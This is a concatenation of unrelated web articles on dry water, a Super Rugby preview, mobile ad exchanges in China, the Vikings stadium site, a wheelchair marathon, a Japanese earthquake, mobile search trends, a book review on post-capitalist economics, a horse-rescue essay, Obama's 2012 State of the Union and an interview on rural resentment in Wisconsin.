Dry water was first patented in 1968 and was immediately snatched up by cosmetic companies as it appeared to have potential applications in the cosmetics field. [2] It was rediscovered in 2006 by the University of Hull , UK , and has since been evaluated and studied for its potential use in other fields. [2] The dry water itself is easy enough to manufacture. The hydrophobic silica nanoparticles and water are blended together using a motor with a stirring rod and impeller that spins at 19,000 rpm for 90 seconds, which coats the water droplets completely. [3]
Certain gases, when mixed with dry water, combine with the water, which then traps them in a solid clathrate hydrate cage. This presents the possibility that explosive gases could be easily transported with a reduced risk of accidental detonation.[3] Dry water is currently being considered for use as a carbon sequestration agent to capture and seal away greenhouse gases in the atmosphere.[4] Scientists consider that dry water will prove useful in the future to help fight global warming as it was found that it could store as much as three times more carbon dioxide than ordinary water over a similar length of time.[3] Dry water also has applications for the transportation and storage of dangerous materials. It can be used as a medium for volatile compounds, as materials stored within the dry water can be reduced to powder and stabilized – reducing not only the volatility of the substance, but also its weight for transport.[5][citation needed] It has also been theorized that dry water could have potential uses in the construction of fuel cells for automobiles due to its ability to store and stabilize very large amounts of volatile gases and materials without permanently binding them.[5] Due to its nature, dry water is classified as an adsorbent material. It has many potential uses in fields where emulsions are required or used.[5] Recent studies have also found dry water to help jumpstart reactions or to work as a catalyst.[6]
Super 15 Rugby Round 20 Preview
Super 15 Rugby Round 20 is here and this is the last game for nine teams, while the other six are jostling for position with the playoffs just around the corner. For SuperBru punters Super Rugby Round 20 represents a great opportunity for plenty of placings to make a late bid for glory with plenty of potential upsets on the cards. Most of the top teams have away matches against lower placed teams, many of these matches are local derbies. There also could be some massive margins this week when you consider how big the margins were in the Chiefs vs Crusaders and Cheetahs vs Blues last week.
Super 15 Rugby Round 20 is here and this is the last game for nine teams, while the other six are jostling for position with the playoffs just around the corner. For SuperBru punters Super Rugby Round 20 represents a great opportunity for plenty of placings to make a late bid for glory with plenty of potential upsets on the cards. Most of the top teams have away matches against lower placed teams, many of these matches are local derbies. There also could be some massive margins this week when you consider how big the margins were in the Chiefs vs Crusaders and Cheetahs vs Blues last week.
The Australian teams will be at a disadvantage having just finished a tough three match series against the British and Irish Lions. This will take its toll. The Reds for example, will be without both Will Genia and James Horwill for their match against the Waratahs.
The Crusaders are hitting their straps and will want to cement fourth spot on the ladder against the Hurricanes. They have a largely unchanged side and if the Hurricanes don't improve their defence from last week, the Crusaders could post a massive win.
Both the Rebels and Highlanders are at the wrong end of the table, but I think that the Highlanders are in great form, while the Rebels have benched one of their best players, James O'Connor and I don't think they have the depth to have this luxury. The Highlanders are a dangerous side and have definitely underperformed this season. They will be looking for an impressive win in their last game.
The Blues and Chiefs got thrashed last week and meet in the local derby. The Chiefs need to win to have any shot at finishing top overall and one point will confirm their place at the top of the New Zealand conference. It has been a disappointing last month for the Blues and I expect that to continue.
I am picking the Brumbies to win away against the Force, despite the large number of Brumbies involved in the Wallabies team. They have developed enough depth to still beat the Force in Perth.
The Sharks should beat the Kings easily, although they will need to convert more of their chances than they did last week against the Bulls.
While we think the New Zealand teams have rivalries, the other two matches features games between teams that hate each other.
I am picking the Stormers to upset the Bulls this week and do the Chiefs a great favour, while the Waratahs will beat the Reds who will desperately miss both Genia and Horwill. The Stormers and Waratahs have nothing to lose and don't have to worry about saving themselves for playing in the finals.

When asked what the mobile exchange environment looks like in China right now, PapayaMobile co-founder and CEO Si Shen said, “I haven't seen too many private exchanges. ... Then again, I don't see much in the way of open exchanges, either.” But that's because RTB is still brand spanking new. PapayaMobile subsidiary AppFlood — whose top competitors include inMobi and China-based mobile DSP Avazu — launched China's first mobile RTB platform back in April. As AdExchanger reported at the time, AppFlood's goal is to be a sort of global RTB bridge that connects the East with the West. AdExchanger caught up with Google vet Shen to talk RTB, app monetization and why Google doesn't seem to be all that bothered about Chinese demand-side platforms. ADEXCHANGER: First off, give me a quick thumbnail sketch on AppFlood.
SI SHEN: We run both a DSP and an ad exchange on mobile. Our DSP talks to Google's DoubleClick and [Chinese search engine] Baidu to bid on supply-side both inside and outside of China. We're still trying to see what kind of supply we can get in China. Budget from China is going overseas and growing very rapidly. Advertisers use our DSP in China to get traffic from outside of China. We have about 600 million daily impressions on our DSP. Our eCPM is around about 40 cents. We have offices in the US And Europe and we're connected to about 20 supply-side platforms there with more coming.
What do US advertisers need to know about the mobile supply side in China?
In the West you can see a fairly mature market. A lot of SSPs there are focused on mobile; for example, Google's DoubleClick and MoPub.
But in China there aren't all that many supply-side platforms focused on mobile yet. DoubleClick has sizable traffic on mobile, but because their business is so big and they're connected to so many DSPs already, it's actually hard for Chinese DSPs to get connected to DoubleClick. RTB is still young in China and Chinese DSPs need to overcome their technical issues in terms of integration before they can get connected to DoubleClick.
Why is that?
The Chinese DSPs, are still in a very early stage in terms of technology integration, so it might take Google a long time to educate the Chinese DSPs on how to do this. The market is still very early. As of now, Google is the largest supply-side provider of mobile traffic in China, but it's really just opening up. For example, the majority of Baidu's RTB supply side traffic is long tail.
Who else in on the scene other than DoubleClick?
The other big provider is [China-based mobile ad exchange] AdsMogo, but their traffic is not even comparable to Google. It's mostly Chinese traffic coming from foreign platforms. We connect to a lot of premium platforms and foreign platforms and see that about 10% or 15% of users are actually from China, although we found that those platforms aren't really utilizing that traffic very well. We collect that Chinese traffic for supply-side platforms.
Is China on the cusp of change?
The coming year is going to be the year where the mobile RTB market grows very fast. More mature DSPs from the web will come to mobile. In terms of supply-side platforms, there will be more non-RTB ad networks that will turn RTB. The market is going to mature very quickly.
How can US developers get in on the action?
RTB is still early in China, but they can always use DoubleClick. That's probably the fastest way to access traffic in China. But the Chinese mobile ecosystem is quite different. For example, if you have a game and you want to access the Chinese market and only buy traffic from RTB or other ad sources, that's not good enough. As a game you'll have to build a relationship with the carrier.
[Note: Until recently, developers looking to monetize their apps in the Chinese market were stymied by fraud, piracy and a confusing array of local Android app stores. Establishing direct billing partnerships with regional wireless carriers like China Mobile, China Telecom and China Unicom removes that friction. Read more at Wired.]
That's because Google Play isn't popular, despite Android being the device of choice in China?
You could use Google Play, but the penetration is small in China, which makes it difficult to charge people. If you use other local app stores, the conversion rate in terms of people paying is really low because the local stores don't integrate their SDK and users have to go through a complicated process to enter their credit card information. People either don't want to enter their credit card information on their phone or a lot of people actually don't even have credit cards.
The only reliable way for any apps to charge users in-app is to provide carrier billing, and to do that you need to work with a local company. If a game outside of China wants to enter China, they need to partner with a Chinese agency and publish their games here.
Gov. Mark Dayton told the Minnesota Vikings on Monday that the only workable site this year for a new stadium is the Metrodome, apparently bringing the team's long search for a new home back to where it started.
"The governor spoke to Mr. Zygi Wilf this afternoon and told him that if we are going to get a stadium bill passed this year, it will have to be at the Metrodome site," said the governor's spokeswoman, Katharine Tinucci.
She said Wilf, the team's owner, will come to Minnesota on Wednesday, the day after the 2012 legislative session begins, to meet with Dayton.
Vikings spokesman Lester Bagley said the team is upset by the news, which came just the team appeared to be shifting from its preferred site in Arden Hills to the so-called Linden Avenue location near the Minneapolis' Basilica of St. Mary.
"We were told by the governor's office that Linden Avenue is not workable, at least in the short term," said Bagley, the team's vice president of public affairs and stadium development. "All I can tell you is that our ownership is extremely frustrated with the situation." The basilica's rector, the Rev. John Bauer, made clear in recent days that he might consider legal action to protect the 100-year-old structure, which is on the National Register of Historic Places.
Dayton's decision comes days after he said that the Metrodome, Linden Avenue and Arden Hills sites all had flaws and that it was a "genuine possibility" no stadium agreement would be reached at the Legislature this year.
The state's 201 legislators return to St. Paul this week and Republicans, who control the House and the Senate, have been ambivalent about the urgency in reaching a stadium deal this year, even though the Vikings say their lease at the Metrodome expires on Feb. 1.
The team says the Metrodome site does not provide as good a "game day" experience as other potential sites would and noted that the team would lose money if it is required to play at the University of Minnesota's TCF Bank stadium while the Metrodome is rebuilt. The Vikings have said there would be at least $50 million in additional costs.
Teresa McFarland, a basilica spokeswoman, said the church had not received confirmation that the governor was dropping the Linden Avenue site and said the church wouldn't comment.
When Dayton met with Bauer on Friday, stadium negotiators were already working to solve some of the problems associated with the site.
Ted Mondale, Dayton's chief stadium negotiator, said lawyers were attempting to get around a requirement that nine City Council votes in Minneapolis would be needed to sell city land near the basilica for the project. He said a new legal opinion obtained for the Metropolitan Sports Facilities Commission argued that only seven votes would be required because the city would be selling the property to another public entity. Mondale is the chair of the commission.
Last Wednesday, Dayton said the Linden Avenue site might be the right spot for a stadium. But before meeting with Bauer on Friday, he expressed reservations.
"We all want to look at what their objections are and see whether they could be resolved or not. I'm not full-steam ahead ... I'm not prepared to recommend that site. I don't consider it viable as it stands today. There may be other unanswered questions," Dayton said.
Minneapolis officials, including Mayor R.T. Rybak, have said that rebuilding the Metrodome would be easier to approve in the council than building at the Linden Avenue location.
Minneapolis City Council Member Meg Tuthill on Monday called the Linden site "totally unacceptable" because of potential harm to the basilica and the need to relocate some businesses.
"I just can't imagine that we would build a stadium there for a multitude of reasons," Tuthill said. "So I'm very pleased to hear it's off the table." Tuthill is one of three council members who are undecided about the mayor's proposed funding plan for the stadium. "Putting it in the Metrodome is the only thing that makes sense," Tuthill said. "Now we have to look at the rest of the plan and see what we can come up with."
The Star Tribune owns five blocks near the Metrodome that could be involved in a stadium deal. The Vikings struck a tentative $45 million deal for that property in 2007 but withdrew, citing turmoil in credit markets.
The Vikings also negotiated an agreement with Ramsey County last year to build on the old Army ammunition site in Arden Hills, which the team said was an "ideal" home. But Ramsey County's proposed financing idea -- a local sales tax -- would likely fail at the polls and key lawmakers said they would not approve the tax without a referendum. Another possible site at the Farmers Market in Minneapolis also failed to come together, leaving just Linden Avenue and the Metrodome, where the team has played since 1982.

NEW YORK — Tatyana McFadden captured the second-ever marathon Grand Slam, winning the New York City Marathon women's wheelchair division on Sunday on top of her titles in Boston, London and Chicago earlier this year.
Who was the first athlete, able-bodied or wheelchair, to win four major marathons in one year? Also McFadden, who also won Boston, London, Chicago and New York City last year.
In the last 26 months, McFadden won three gold medals at the London 2012 Paralympics (giving her 10 career Paralympic medals), six gold medals at the 2013 IPC World Track and Field Championships, one cross-country skiing silver medal at the Sochi 2014 Paralympics and those eight major marathon titles.
“I cannot believe that I have won eight marathons in a row,” McFadden said. “This is absolutely incredible.”
Meb Keflezighi fourth in men's race | Wozniacki breaks 3:30 | Women's race ties the closest ever
On Sunday, McFadden conquered a 23.2-mile route rather than the standard 26.2-mile course for her third New York title (she won her first in 2010). She finished in 1 hour, 42 minutes, 16 seconds in Central Park.
She won by 1:08, after falling out of her chair near the finish on a tight right turn.
“It was quite embarrassing,” McFadden said, “but I owned it at that moment, and I got back in and took one look behind me to make sure the girls didn't catch me.”
The wheelchair start was moved from the Verrazano Bridge in Staten Island into Brooklyn due to high winds. Gusts of 40mph were expected. McFadden agreed with the decision to race 23.2 miles instead of 26.2.
“That was just a safety call,” McFadden said. “It was very, very windy. So in the race, you had to be smart. You had to be strategic. And you had to conserve, and you had to think about where your strength and weaknesses are throughout the entire race.”
New York Road Runners, which puts on the marathon, believes a shortened wheelchair race has happened before due to high winds, in 1995, but couldn't confirm officially.
McFadden was born in Russia paralyzed from the waist down due to spina bifida and adopted from a St. Petersburg orphanage at age 6 by an American family.
She is 25 years old and next plans to race in the Oita International Wheelchair Marathon in Japan on Nov. 9. She hopes to make her fourth U.S. Paralympic team in 2016.
Australian Kurt Fearnley won the men's 23.2-mile wheelchair race in 1:30:57 for his fifth title in New York.

The quarters keep going by and PC sales keep going down. Surely, though, you think, "PCs really can fall behind smartphone and tables, can they?" I'm sorry to disappoint you but by one important metric, they already have. Google announced "more Google searches take place on mobile devices than on computers in 10 countries including the US and Japan."
-- comScore
No wonder Google recently made its biggest algorithm change in years as it now using a site's "mobile friendliness" as a way to rate it. People in the ad and search business call this change "Mobilegeddon." Inside Google, they probably call it, "catching up with the times."
A related Google study, which was released on May 6, found that mobile apps, and not web browsers, now account for an average of 30 hours per user per month. Therefore, Google is encouraging companies to invest in apps.
But, simply releasing an app for your service or site isn't enough. Google suggests you make it easy for users to find your apps by search engine and advertise them. On top of that, Google suggests you refresh your app periodically, add ads within them, and add deep links to those ads.
Not everyone agrees with Google's analysis. ComScore in its March 2015 digital device and traffic survey found, "While most of the growth in digital media consumption over the past four years has occurred on smartphones (up 394 percent) and tablets (up 1,721 percent), these mobile platforms are not eating into aggregate time spent on desktop, which has still grown 37 percent over this time."
Still, comScore also found mobile search queries, including both smartphones and tablets, came to only 29 percent of total search volume. On the other hand, the research firm also discovered that in 2014 Facebook's mobile revenue surpassed its desktop revenue.
Another take from comScore's data, which might explain Google new emphasis on mobile, from the publication Search Engine Land is that "Google search revenues may have essentially peaked on the PC. Google thus either has to take share from rivals on the PC or boost mobile search revenues to maintain growth."

Economics After Capitalism: A Guide to the Ruins & a Road to the Future
By Derek Wall
Pluto Press, 2015
Derek Wall, ecosocialist activist and international coordinator of the Green Party of England and Wales, has written a primer on the main strands of economic critique of globalised capitalism.
It is a short and easily readable book, well suited to someone looking for a starting place. For those already embedded in one of these strands, it provides a welcome introduction to some of the others.
It is written in a pedagogical rather than polemical way, promoting understanding before judging — although Wall does not shy away from explaining his own views in the end. This is a great format.
“Globalisation” has been so transparently unstable and unfair that it has generated its own internal critique from Keynesian “insiders” like billionaire investor George Soros and former World Bank chief economist Joseph Stiglitz.
Wall says that despite their genuine insights, and those of John Maynard Keynes whose views he also outlines, these figures are “vaccinating against anti-capitalism”. They want to save the system by repairing it. Whether this can succeed is another question.
Other critics of unregulated capitalism (but not necessarily of capitalism per se) that Wall looks at are anti-corporate power campaigners and “funny money” theorists, who were prominent in the 2011 Occupy Wall Street movement that spread around the world.
The “funny money” theories, centring on how fractional reserve banking creates money by issuing credit, have origins in the Social Credit movement founded by the anti-Semitic Major CH Douglas in the early 20th century. Despite this odd origin, there are some interesting insights.
Nevertheless, these ideas are criticised by Wall, in the end, for failing to understand the overall system. Instead, they focus on futile bids to reform only one of its facets — the banks and international finance.
A further trend Wall presents is the traditional Green economic theory, represented particularly in the “small is beautiful” school. This is reflected in policies such as creating local currencies and promoting small business.
This view has an important insight, namely “that economics is a system that tends to dominate and distort human values”. This leads to challenging the assumption that human wants are unlimited (unlike resources to meet them).
Wall says: “Greens would argue that instead, the economic system in its reliance on economic growth, makes us want more and more … through branding, advertising.”
Yet there are more systematic critiques of capitalism than traditional Green views, and some of these overcome its pro-market weaknesses. Marxism is a broad school, and Wall gives a summary of Marx's own views, followed by later developments. He finishes with three outstanding contemporary Marxist thinkers: Fidel Castro, Hugo Chavez and British political economist David Harvey.
Wall sometimes describes Marx as ambivalent about whether he supported capitalist globalisation or not: was it a force for material progress or a brutal imposition on the colonial world? This seems a laboured device at times. Marx was not necessarily in two minds himself, so much as describing a contradictory process as it unfolded: where capitalism brought great suffering, it also brought a great development of economic forces, which may in turn lay the basis for more positive changes.
Wall leaves this apparent contradiction hanging, but partly answers it later in the book. Whether he does justice to Marx is a matter for further debate.
Moving on to the “autonomist” school that has risen to prominence in the last 20 years, Wall looks at an alternative to understanding capitalism according to objective economic laws. Autonomists, drawing on Marx, anarchism and postmodernism, see capitalism developing “subjectively” in response to the (often latent) rebellion of the working class.
At every turn, capitalism seeks to disorganise and disrupt the process of “recomposition” that may bring more coherence to anti-capitalist resistance among the working class.
Rounding off the survey, two currents, perhaps closest to Wall himself, are surveyed: ecosocialism and ecofeminism.
Whether it is greens seeking to import a socialist analysis, or Marxists seeking to incorporate the insights of ecology, ecosocialism is a diverse, but vibrant and new set of ideas. Here we meet the concept of “the commons” — communal property in various forms, with ecosocialism fighting to extend this valuable alternative to private property and the neoliberal market.
Whereas autonomism is defined as much by its diverse practice as its theorists, ecofeminism is a largely academic school. This might seem easier to survey, but the range of views within it are broad. These are by no means all anti-capitalist, but offer some radical perspectives on how labour and nature are understood.
Here we also meet Nobel Prize-winning economist Elinor Ostrom, whose life work looked at many examples of “commons” in practice through history. Ostrom uncovered how they succeed (where neoliberal theory says they cannot), but also where and how they fail.
Ostrom was not a radical anti-capitalist, but if commons are to be a foundation stone of new economics (as Wall suggests), then Ostrom is surely an important contributor.
In the conclusion, Wall cites Ostrom and Marx as two key thinkers that need to inform efforts to create a post-capitalist economics. Marx, for keeping the global and revolutionary aspects of communal, anticapitalist economics in perspective, and Ostrom for invaluable insight at the micro scale.
Wall's message, in summing up, is to defend and extend the commons beyond capitalism. We cannot settle for reforms to the system, as some like the Keynesians Soros and Stiglitz would have us do. We must also be wary of commons efforts being co-opted by the system.
Yet we also cannot wait until after the revolution: “To say no change is possible until everything changes … is the ideology of the dogmatist.”
In such a wide-ranging survey of extremely diverse schools of thought, it is inevitable that not everyone will be satisfied. I have indicated some dissatisfaction with the treatment of Marxism. On the other hand, the outlines of many other schools of thought, perhaps equally unsatisfactory to their own adherents, were often illuminating and gave me new sympathy for their views and efforts.
In looking for inspiration for post-capitalist economics, some contemporary examples are treated, but too briefly: the real revolutionary experiences of Venezuela and Bolivia, in Latin America, and the revolutionary experiment in Rojava in Syria's north.
Rojava, although very new, has started off like most 20th century revolutions — radicals seizing an opportunity amid the collapse of a capitalist state due to war or civil war. Yet the philosophy of Rojava's leaders is quite new, owing as much perhaps to anarchist and ecosocialist thought as to Marxism. Wall touches on it; perhaps the history being written there is too unfinished to write more.
Venezuela and Bolivia, on the other hand, have come to power through elections, a path that repeatedly ended with blood or betrayal in the 20th century — and still may, as the experience of the 2009 coup against Manuel Zelaya in Honduras and Syriza's capitulation to austerity in Greece attest.
If there is a criticism of the book's content, it is that it perhaps pays too little attention to these kinds of real, living examples that have progressed so much since the first edition of the book appeared in 2005.
The more formulaic injunction to defend and extend the commons is important, but it requires more elaboration in practice. Perhaps that practice is yet to come.

Japan's northeastern coast was hit Friday by a 6.5-magnitude earthquake, triggering a brief tsunami advisory for waves of up to 20 inches.
The earthquake, which struck at 2:36 p.m. local time, was centered 70 miles off the coast of Fukushima and 175 miles northeast of Tokyo. There were no immediate reports of damage or injuries, and the Tokyo Electric Power Co. said that its disaster-hit Fukushima Daiichi nuclear plant was experiencing no further problems.
The tsunami advisory was issued for both Fukushima and Miyagi prefectures, two of the areas the hardest hit March 11 by a 9.0-magnitude earthquake and resulting tsunami.
There were no immediate reports of high waves caused by Friday's earthquake.
This earthquake was the biggest to hit Japan in more than a month. But the country's northeastern coast has been the site of more than 1,000 aftershocks of magnitude 4.0 or higher since March.
At the nuclear plant, some employees were temporarily evacuated immediately after the earthquake. Bullet trains in the region also briefly stopped running.
Two years ago, when I found myself temporarily retired by a jobless universe, I moved back in with my parents, who live on a farm in Ireland . Many a stressed-out New Yorker would kill for the chance to unwind in an emerald paradise remote enough that a strange car passing up the road was a thrill, but I found myself floundering, unable to make peace with the fact that I was no longer a contributing member of society.
The world seemed to be in an unholy mess, with earthquakes and wars and financial and glacial meltdowns, and it just didn't feel O.K. to be sitting out the storm like Lady Muck on her landed estate, however splendid the isolation.
I was desperate for a cause of some sort to validate my existence, so the day I saw a local member of the Garda trying to catch a runaway horse, I jumped at the chance to help out. We had to drive the horse off the road before he caused an accident, but he couldn't be lured from the lush grass of the roadside ditch. When I got closer, I could see why. The poor animal was skin and bone, and the field he just escaped from was barren as a desert. As we gave him a chance to fill his empty belly, I felt awash with guilt that I had been so overwhelmed by the world's out-of-reach problems that I ignored this tangible one right on my doorstep.
The field in question was part of a forest-management project, so the guard reckoned the horse must have been abandoned there by an owner who couldn't afford the upkeep any longer, something he said had been happening all too frequently of late. I suddenly remembered having seen two horses in that field, but there was no sign now of the other one. “He'll be dead then,” said the guard darkly, “and this one's days are numbered, too.” I was outraged and demanded that something be done. Eventually the guard promised to call the animal sanctuary, but he said it wouldn't be able to send someone until the weekend, and he didn't think the horse would survive that long.

He obviously had no idea with whom he was dealing. I wasn't about to let a sense of purpose like this slip through my fingers. Maybe I couldn't solve world hunger or broker peace in the Middle East , but I could keep this poor horse alive.

All I needed was a bit of hay, and as we didn't have any at our place, I helped myself to an old round bale I found lying idle in an abandoned farm nearby. It was a bit smelly and wet and past its prime, but the horse had no problem wolfing it down.
President Obama warned the nation Tuesday that the decades-old promise of a secure and rising middle class is under threat because of growing disparities between the rich and everyone else in America.
In an election-year State of the Union message that will likely serve as the template for the months of campaigning ahead, Obama outlined a series of steps that he believes will reinforce the tentative economic recovery, including proposals to eliminate tax incentives for companies to move jobs overseas, to make college more affordable and to expand help for credit-worthy homeowners looking to refinance mortgages at historically low interest rates.
None of the proposals constitutes a single bold stroke to revive the economy, but the heart of Obama's message — one he has underscored in appearances around the country in recent months — was that America's wealthiest citizens must do more to cement the economic recovery and pull the country from its dire fiscal condition.
The approach was typified by his call for those who make more than $1 million a year to pay a tax rate of at least 30 percent and to forgo a host of deductions he said they do not need.
In detailing what he called a “blueprint for an economy built to last,” Obama struck the populist chords that his Republican presidential rivals have criticized as “class warfare.” But he has seen his approval ratings rise on the strength of that message, particularly among the independent voters who helped elect him in 2008 but had grown disappointed by his leadership in office.
“We can either settle for a country where a shrinking number of people do really well, while a growing number of Americans barely get by,” Obama told a boisterous House chamber and a prime-time television audience, “or we can restore an economy where everyone gets a fair shot, everyone does their fair share and everyone plays by the same set of rules.
“What's at stake are not Democratic values or Republican values, but American values,” he continued. “We have to reclaim them.”
Obama spoke from a stronger position politically than he has been in for months. His approval rating, according to a new Washington Post-ABC News poll, stands at about 50 percent, and a majority of independent voters now look favorably on his performance in office.
But his advisers are well aware that his pursuit of a second term is imperiled by a still-staggering economy and a perception, even among those in his own party, that he has not effectively challenged Republicans to pass his economic plans.
Nearly all of the roughly hour-long speech Tuesday was devoted to the economy. Obama spent only a brief time on foreign policy.
He underscored that in the past year he has overseen the killing of Osama bin Laden and the end of the Iraq war, an unpopular conflict that he had pledged to end as a candidate. Adm. William McRaven, who oversaw the May raid that killed bin Laden, was invited to sit with first lady Michelle Obama for the address.
In his speech, Obama proposed using half of the “peace dividend” as he ends America's wars in Afghanistan and Iraq — about $200 billion over the next six years — to pay for the construction of new roads, bridges, rail lines and other infrastructure that he said is critical to the country's ability to compete in a global economy.
In a tacit response to criticism from his Republican rivals, he also announced that he would create a “trade enforcement unit” that will allow the government to more aggressively pursue unfair trade practices in countries around the world.
He specifically mentioned China, long accused of keeping its currency unfairly low against the dollar to boost exports and make U.S. imports more expensive. Mitt Romney, the former Massachusetts governor and a leading candidate for the Republican presidential nomination, has criticized Obama for failing to challenge China over its trade practices.
As he has in the past, the president spoke optimistically about the trajectory of the economy, which, he has repeatedly reminded Americans, was in the depths of a recession when he took office and is now adding jobs. The unemployment rate still stands at 8.5 percent, dangerously high for an incumbent seeking a second term.
But his focus Tuesday was on economic unfairness, a theme he has emphasized in recent weeks, most notably in a speech last month in Osawatomie, Kan.
There he declared the trickle-down economics of his Republican predecessors a failure that the country should not return to in November, and Tuesday he echoed that message.
“As long as I'm president, I will work with anyone in this chamber to build on this momentum,” Obama said. “But I intend to fight obstruction with action, and I will oppose any effort to return to the very same policies that brought on this economic crisis in the first place.”
In the Republican response to his address, Gov. Mitch Daniels of Indiana said that “no feature of the Obama presidency has been sadder than its constant efforts to divide us, to curry favor with some Americans by castigating others.”
“As in previous moments of national danger, we Americans are all in the same boat,” Daniels said. “If we drift, quarreling and paralyzed, over a Niagara of debt, we will all suffer, regardless of income, race, gender or other category. If we fail to shift to a pro-jobs, pro-growth economic policy, there will never be enough public revenue to pay for our safety net, national security or whatever size government we decide to have.”
Many of the proposals Obama outlined Tuesday were ones he has raised before, including some left over from last year's State of the Union address.
But all of them appeared tailored to appeal to middle-class interests and anxieties, especially those concerning the direction of the economy and where the next generation of jobs will come from.
“We will not go back to an economy weakened by outsourcing, bad debt and phony financial profits,” he said, adding that he wants “an economy built on American manufacturing, American energy, skills for American workers and a renewal of American values.”
Obama said he would open up new federal land to develop wind farms and solar energy plants to reduce the nation's reliance on foreign oil.
He warned colleges and universities that they risk losing federal funding if they do not keep tuition costs down. He reiterated his call for Congress to extend the payroll tax cut through the end of the year, a benefit to working-class families.
And he called on Congress to help homeowners who are current on their payments but unable, for whatever reason, to refinance at lower mortgage rates. He proposed using revenue from the administration's proposed fee on banks to help finance the initiative.
“Think about the America within our reach: a country that leads the world in educating its people,” he said. “An America that attracts a new generation of high-tech manufacturing and high-paying jobs. A future where we're in control of our own energy, and our security and prosperity aren't so tied to unstable parts of the world. An economy built to last, where hard work pays off, and responsibility is rewarded. . . .
“The defining issue of our time is how to keep that promise alive,” he added. “No challenge is more urgent. No debate is more important.”
Obama spoke as the top Republican candidates for the presidency are debating economic fairness on their own terms, with Romney, a former venture-capital chief executive, defending his large income and relatively low tax rate.
Romney released tax returns Tuesday that show he paid an effective tax rate of 13.9 percent on his 2010 income of $21.6 million. He estimates payment of an effective rate of 15.4 percent on income of $20.9 million in 2011 — below the rate that the White House says many middle-class families pay.
To make the case for a host of economic proposals he is likely to unveil in the speech, Obama invited the billionaire investor Warren Buffett's secretary, Debbie Bosanek, to sit with the first lady in the House chamber for the speech.
Bosanek is the inspiration for the president's call for wealthier Americans to pay a higher tax rate, known as the “Buffett rule,” which Obama first announced in September but described Tuesday in the most detail to date.
The Buffett rule — which the president said was developed after the billionaire investor said he paid a lower effective tax rate than his secretary — forms a key component of Obama's plan to boost short-term spending to help create jobs for the middle class.
But Obama's advisers said he will not include the tax rate or the deductions he believes should be eliminated for the wealthiest Americans in his budget, which he is scheduled to present next month. As a result, it serves more as a political marker than a firm proposal.
“Let's never forget: Millions of Americans who work hard and play by the rules every day deserve a government and a financial system that does the same,” Obama said. “It's time to apply the same rules from top to bottom: no bailouts, no handouts, and no cop-outs. An America built to last insists on responsibility from everybody.”
Congressional Republicans have vowed to oppose any new revenue — including a higher tax rates for millionaires — at a time when the national deficit continues to soar and Congress is trying to identify $1.5 trillion in budget cuts agreed to last summer.
At the Capitol, House Speaker John A. Boehner (R-Ohio) said Tuesday that Obama's policies “are just going to double down on what hasn't worked.” He said “the politics of envy, the politics of dividing our country is not what our country is all about.”
Congressional Republicans have expressed deep concern over the size and expense of the federal government, favoring a reduction in spending and tax cuts to spur economic growth rather than spending.
In a statement, U.S. Chamber of Commerce president Thomas J. Donohue said “too many of the solutions he proposed rest on higher taxes, more spending, and an avalanche of new regulations. “
“The way to create the jobs Americans need is to grow our free enterprise economy, not to further expand the federal government.,” he said.

The divide between urban and rural communities, which has existed essentially everywhere for centuries, took on a singular importance to many of us when Donald Trump was elected last November. In her new book, The Politics of Resentment: Rural Consciousness in Wisconsin and the Rise of Scott Walker, political scientist Katherine J. Cramer looks at what happened in 2016 through the lens of Wisconsin Gov. Scott Walker's rural popularity, despite policies that would endanger his rural and working-class constituents.
I recently spoke by phone with Cramer, who is also a professor of political science at the University of Wisconsin-Madison. During the course of our conversation, which has been edited and condensed for clarity, we discussed how rural dwellers see city folk, whether economics or race motivate their votes, and how rural voters in Wisconsin feel about Trump now.
Isaac Chotiner: How did you start researching this subject of “rural consciousness”?
Katherine J. Cramer: I started back in May of 2007. The research consisted of sampling 27 communities across the state of Wisconsin and then identifying a group of regulars that I could get access to—that I could invite myself into their conversations. Initially, the places I was spending time in were rural places but also urban and suburban places. I wasn't looking for a rural versus urban divide, but about a year in, it was pretty obvious that what I was hearing in the smaller communities was just a pretty intense resentment, and I was hearing it in various corners of the state. The resentment was basically oriented towards cities, and it took the form of people saying to me, “People in places like ours just don't get our fair share of anything. We don't get our fair share of attention. We don't get our fair share of resources, and we don't get our fair share of respect.”
How did this manifest itself in the myriad battles that Scott Walker fought in Wisconsin?
For people who were saying, “The system is broken, and it's not benefiting people like us, and we're struggling to make ends meet, and it seems like we're working really hard and we deserve more, and it seems to us that there are people who are not working as hard who seem to be getting more than their fair share,” then Scott Walker tapped into that by saying, “Public employees, probably it's time that they paid in more to the pot. It's time that they contribute more to their health care and pensions, and that would be fair.” That played really well, the legislation that undercut public employee unions.
He tapped into it in other ways, too. One way, in particular, that really stands out to me was a high-speed train line that was to be federally funded to run between Madison and Milwaukee, our two main urban centers in the state. The previous governor, Jim Doyle, a Democrat, had lobbied for and accepted federal funding, $810 million in federal funds, to build this train. When Walker was running for governor, the way he talked about it was, “These are hard-earned taxpayer dollars that are going to go to fund this train that's going to benefit people in Madison and Milwaukee and not people in other parts of the state.” In that kind of subtle way, he also tapped into the sense that the people in the cities get everything, and we're not getting what we need. Walker definitely knew how to tap into it.
How does your research make you feel about the economics vs. culture/race debate around Trump's success?
You can't separate culture and economics. When people are telling me that they're not getting their fair share, and they're feeling like all the taxpayer dollars go to the cities, and that they pay in a lot of taxes but they don't see that money in return, they're also telling me, “That money is going to people who don't deserve it as much as I do, and don't seem to be working as hard as I do.” And some of that is racist sentiment. Whether we're talking about cultural issues in terms of race or ethnicity or immigration, we're also talking about it in terms of just the lifestyles of city people versus the lifestyles of people in rural areas, and the sense of who works hard: People who sit behind a desk all day or people who are doing manual labor? Economic insecurity is intertwined with their sense of deservingness, which is a very cultural notion. So in my mind you can't really separate the two.
My research has also taught me that racism is very much a part of the conversation even when people aren't saying blatantly racist things. I think a lot of times this debate between “is it racism or is it economics” gets caught up in whether individuals are racist and forgets that the whole system in which we are operating was founded on some pretty racist policies.
Right, and there is also the question of to what degree that rural identity itself is often based on race.
It's definitely the case that these places are far less racially diverse, and it's definitely the case that people in rural areas by and large have far less experience with people of different racial and ethnic backgrounds than folks who live in a more urban or sometimes even suburban space. Much of the “we are not the city” is partly about “but we are a good thing, which is close to the land, knowing our neighbors, a slower pace of life” types of concerns. I think being built around white identity is definitely a part of it, but I wouldn't say that's the essential part of rural identity.
If more government money were going to rural areas, would these sorts of feelings be salved? Or is the cultural divide now so deep that changing material reality wouldn't matter much.
